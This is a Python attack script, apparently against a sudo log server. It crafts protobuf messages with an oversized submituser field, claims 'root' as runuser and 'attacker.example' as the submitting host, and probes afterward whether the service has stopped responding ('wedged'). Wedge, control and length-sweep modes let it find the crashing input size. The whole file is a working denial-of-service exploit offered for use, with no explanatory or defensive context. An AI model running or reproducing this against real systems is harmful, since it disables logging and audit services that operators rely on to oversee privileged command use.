#!/usr/bin/env python3
import argparse, socket, sys, time
SYSLOG_MAXLEN, CONT_FMT_LEN, SPECIFIERS = 960, 28, 5
def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F; n >>= 7
        out.append(b | 0x80 if n else b)
        if not n: return bytes(out)
def field(num, wire, payload): return varint((num << 3) | wire) + payload
def ld(num, raw): return field(num, 2, varint(len(raw)) + raw)
def info(key, value): return ld(1, key.encode()) + ld(3, value.encode())
def accept_message(submituser, command):
    msg = ld(1, field(1, 0, varint(1)))
    for k, v in (('submituser', submituser), ('submithost', 'attacker.example'),
                 ('runuser', 'root'), ('command', command)):
        msg += ld(2, info(k, v))
    return ld(1, msg)
def responsive(host, port, timeout=3.0):
    try:
        with socket.create_connection((host, port), timeout) as s:
            s.settimeout(timeout); return len(s.recv(4096)) > 0
    except OSError: return False
def send(host, port, length):
    body = accept_message('u' * length, '/usr/bin/' + 'A' * 300)
    wire = len(body).to_bytes(4, 'big') + body
    with socket.create_connection((host, port), 5.0) as s:
        s.settimeout(3.0)
        try: s.recv(4096)
        except OSError: pass
        s.sendall(wire); time.sleep(0.3)
    return len(wire)
def budget(n): return SYSLOG_MAXLEN - (CONT_FMT_LEN - SPECIFIERS + n)
def probe(host, port, attempts=5):
    for _ in range(attempts):
        if responsive(host, port): return True
        time.sleep(1.0)
    return False
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host'); ap.add_argument('--port', type=int, default=30343)
    ap.add_argument('--length', type=int, default=937)
    ap.add_argument('--mode', choices=('wedge','control','sweep'), default='wedge')
    ap.add_argument('--sweep-from', type=int, default=900)
    ap.add_argument('--sweep-to', type=int, default=980)
    a = ap.parse_args()
    if not responsive(a.host, a.port):
        sys.exit('target does not answer ServerHello: already wedged, or not running')
    print(f'baseline_responsive=true target={a.host}:{a.port}')
    lengths = {'wedge':[a.length], 'control':[936,938],
               'sweep':list(range(a.sweep_from, a.sweep_to+1))}[a.mode]
    for n in lengths:
        sent = send(a.host, a.port, n)
        alive = probe(a.host, a.port, attempts=5 if a.mode != 'sweep' else 1)
        print(f'length={n} budget={budget(n)} sent_bytes={sent} wedged={str(not alive).lower()}')
        if not alive: print('verdict=WEDGED'); return
    print('verdict=STILL_ALIVE')
main()
